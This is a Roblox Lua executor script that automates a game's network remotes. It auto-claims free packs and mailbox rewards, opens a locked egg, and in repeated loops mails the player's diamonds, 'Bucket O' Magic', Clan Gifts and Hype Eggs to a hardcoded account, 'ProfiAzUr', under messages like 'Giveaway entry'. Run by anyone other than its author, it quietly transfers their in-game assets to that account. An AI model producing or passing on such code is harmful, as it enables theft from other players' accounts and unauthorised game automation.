spawn(function()
    while true do
        pcall(function() 
            game:GetService("ReplicatedStorage").Network["ForeverPacks: Claim Free"]:InvokeServer("Default")
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)


spawn(function()
    while true do
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)

-- Gem Mailer
spawn(function()
    local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
    
    local username = "ProfiAzUr" -- Replace with recipient's username
    local loopInterval = 15 -- Interval in minutes
    local mailTax = 100000 -- Tax deduction for sending diamonds
    local diamondThreshold = 5000000 -- Threshold for sending all gems

    while true do
        print("Attempting to retrieve diamond data...")
        local diamondItem = CurrencyCmds.GetItem("Diamonds")
        
        if not diamondItem or not diamondItem._data then
            print("[ERROR] Failed to retrieve diamond data. Retrying after interval...")
            task.wait(loopInterval * 60)
            continue
        end

        local diamonds = diamondItem._data._am
        local diamondUID = diamondItem._uid 

        print("Diamonds:", diamonds)
        print("Diamond UID:", diamondUID)

        if not diamondUID then
            print("[ERROR] diamondUID is nil. Retrying after interval...")
            task.wait(loopInterval * 60)
            continue
        end

        if diamonds > diamondThreshold then
            local amountToSend = diamonds - mailTax
            if amountToSend <= 0 then
                print("[ERROR] Amount to send is invalid (<= 0). Skipping this cycle.")
                task.wait(loopInterval * 60)
                continue
            end

            print("Threshold reached! Preparing to send diamonds.")
            print("Amount to send (after tax):", amountToSend)

            local args = {
                username,
                "Giveaway entry",
                "Currency",
                diamondUID,
                amountToSend
            }

            print("Args to invoke server:", args)

            local success, errorMessage = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            end)

            if success then
                print("[SUCCESS] Diamonds sent successfully!")
            else
                print("[ERROR] Failed to send diamonds. Error:", errorMessage)
            end
        else
            print("Diamonds are below the threshold. Current amount:", diamonds)
        end

        print("Waiting for the next loop interval...")
        task.wait(loopInterval * 60)
    end
end)

-- Goop Mailer
spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local username = "ProfiAzUr"
    local loopInterval = 10 -- Interval in minutes 
    local sendAmount = 10000 -- Editable amount
    while true do
        local playerInventory = Save.Get()["Inventory"]
        local MiscInv = playerInventory["Misc"]
        print("Searching for Bucket O' Magic...")
        for key, item in pairs(MiscInv) do
            if item.id == "Bucket O' Magic" then
                local availableAmount = item._am or item.am or 1
                if availableAmount >= sendAmount then
                    local amountToSend = availableAmount > sendAmount and availableAmount or sendAmount
                    print("Found Bucket O' Magic item:", item)
                    print("Amount to send:", amountToSend)
                    local args = {
                        [1] = username,
                        [2] = "Thereeee",
                        [3] = "Misc",
                        [4] = key,
                        [5] = amountToSend
                    }
                    print("Invoking Server with args:", unpack(args))
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                else
                    print("Not enough Bucket O' Magic to send. Required:", sendAmount, "Available:", availableAmount)
                end
                break
            end
        end
        print("Finished processing Bucket O' Magic.")
        task.wait(loopInterval * 60)
    end
end)

-- Clan Gift Mailer
spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local username = "ProfiAzUr"
    local loopInterval = 20 -- Interval in minutes 
    while true do
        local playerInventory = Save.Get()["Inventory"]
        local LootboxInv = playerInventory["Lootbox"]
        print("Searching for Clan Gift...")
        for key, item in pairs(LootboxInv) do
            if item.id == "Clan Gift" then
                print("Found Clan Gift item:", item)
                local amount = item._am or item.am or 1
                print("Amount to send:", amount)
                local args = {
                    [1] = username,
                    [2] = "Take my gifts",
                    [3] = "Lootbox",
                    [4] = key,
                    [5] = amount
                }
                print("Invoking Server with args:", unpack(args))
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                break
            end
        end
        print("Finished processing Clan Gifts.")
        task.wait(loopInterval * 60)
    end
end)

-- Unlocks Hype Egg V2
spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local loopInterval = 5 -- Interval in minutes 

    while true do
        -- Attempt to retrieve player inventory
        local playerInventory = Save.Get()["Inventory"]
        local LootboxInv = playerInventory["Lootbox"]

        -- Find the key for the desired item
        for key, item in pairs(LootboxInv) do
            if item.id == "Locked Hype Egg" then
                print("Found item with ID 'Locked Hype Egg'.")
                local ohString1 = key
                local ohNumber2 = 1
                print("Invoking Remote with:", ohString1, ohNumber2)

                game:GetService("ReplicatedStorage").Network["Lootbox: Open"]:InvokeServer(ohString1, ohNumber2)
                break
            end
        end

        print("Finished scanning Lootbox inventory.")
        task.wait(loopInterval * 60) -- Wait for the specified interval before repeating
    end
end)


-- Hype Eggs V2 Mailer
spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local username = "ProfiAzUr"
    local loopInterval = 5 -- Interval in minutes 

    while true do
        -- Attempt to retrieve player inventory
        local playerInventory = Save.Get()["Inventory"]
        local LootboxInv = playerInventory["Lootbox"]

        -- Print details about the Lootbox inventory and find Hype Egg #2
        print("Searching for Hype Egg #2...")
        for key, item in pairs(LootboxInv) do
            if item.id == "Hype Egg 2" then
                print("Found Hype Egg #2 items:", item)
                local amount = item._am or item.am or 1
                print("Amount to send:", amount)

                local args = {
                    [1] = username,
                    [2] = "Take my gifts",
                    [3] = "Lootbox",
                    [4] = key,
                    [5] = amount
                }
                print("Invoking Server with args:", unpack(args))

                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                break
            end
        end

        print("Finished processing Hype Egg #2s.")
        task.wait(loopInterval * 60) -- Wait for the specified interval before repeating
    end
end)



